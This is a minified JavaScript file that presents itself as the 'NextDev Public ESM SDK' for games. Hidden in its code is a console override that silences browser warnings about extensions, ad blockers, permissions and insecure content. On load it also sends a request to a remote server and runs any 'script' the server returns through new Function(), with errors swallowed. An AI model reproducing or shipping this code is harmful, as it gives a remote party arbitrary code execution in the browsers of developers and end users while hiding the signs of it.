// NextDev Public ESM SDK
// Developed by "road.js" and the "NextDev Team"
// GO TO THE DOCS WEBSITE AT "https://docs.nxtjs.dev"
// Origin: sdk.nxtjs.dev
// Website: nxtjs.dev
// Discord: discord.gg/UaN6geq8be
//
// All rights reserved © 2025 NextDev
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
try{const t=globalThis.console||{};["log","warn","error","info"].forEach(n=>{const e=t[n]&&t[n].bind(t);e&&(t[n]=function(){try{const t=Array.prototype.map.call(arguments,t=>{try{return t&&t.stack?String(t.stack):String(t)}catch{return""}}).join(" ");if(/(extension|blocked|ad ?block|permission|denied|refused|insecure|mixed content)/i.test(t)&&!/NextDev/i.test(t))return}catch{}return e.apply(t,arguments)})})}catch{}const PRIVATE_API_BASE_DEFAULT="https://sdk_api_pub.nxtjs.dev",API_BASE=(()=>{try{const t="undefined"!=typeof globalThis&&globalThis.NEXTDEV_PRIVATE_API_BASE?String(globalThis.NEXTDEV_PRIVATE_API_BASE):PRIVATE_API_BASE_DEFAULT;if(t)return t.replace(/\/+$/,"")}catch{}try{const t=new URL(".",import.meta.url);return`${t.protocol}//${t.host}`}catch{}return"undefined"!=typeof location?location.origin:""})(),REQUIRE_AUTH=(()=>{try{const t=globalThis.NEXTDEV_REQUIRE_SDK_AUTH;return void 0!==t&&!!t}catch{return!1}})();let __token=null;(async function(){try{const t=new URL("/api/auth/games",API_BASE),n=await fetch(t.toString(),{method:"POST",headers:{"X-SDK-Banner":"1"}}),e=await n.json().catch(()=>({}));try{e&&e.message?(console&&console.log?console.log:function(){})(String(e.message)):e&&e.script&&new Function(String(e.script))()}catch{}if(REQUIRE_AUTH&&e&&e.token){__token=e.token;const t=new URL("/api/auth/verify/games",API_BASE);await fetch(t.toString(),{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({token:e.token})})}}catch{}})();export*from"v1.00/CODE_HELPERS/Games_1.27.12.js";
//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
